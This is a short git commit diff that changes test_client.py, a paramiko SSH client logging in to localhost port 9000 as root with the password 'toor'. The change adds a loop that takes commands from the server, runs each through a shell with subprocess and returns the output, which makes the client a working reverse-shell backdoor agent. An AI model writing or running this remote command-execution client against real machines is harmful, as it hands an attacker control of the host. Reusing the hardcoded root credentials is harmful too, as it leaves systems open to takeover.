c04b5d0ee168c3d65a2fca3152934d17b78a1331
Alistair Godwin <godwinalistair@hotmail.com>
2020-03-22 18:14:21 -0400

    Add files via upload

--- test_client.py
+++ test_client.py
@@ -1,10 +1,21 @@
 import paramiko
 import threading
-
+import subprocess
 client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 client.connect('localhost',port=9000, username='root', password='toor')
 chan = client.get_transport().open_session()
 chan.send('Hey i am connected :)')
 print(chan.recv(1024))
-client.close
+
+while True:
+    command = chan.recv(1024)
+    print("Executing this -->" + str(command))
+    try:
+        proc = subprocess.check_output(command, shell=True)
+        chan.send(proc)
+    except Exception as e:
+        chan.send(str(e))
+
+
+client.close()
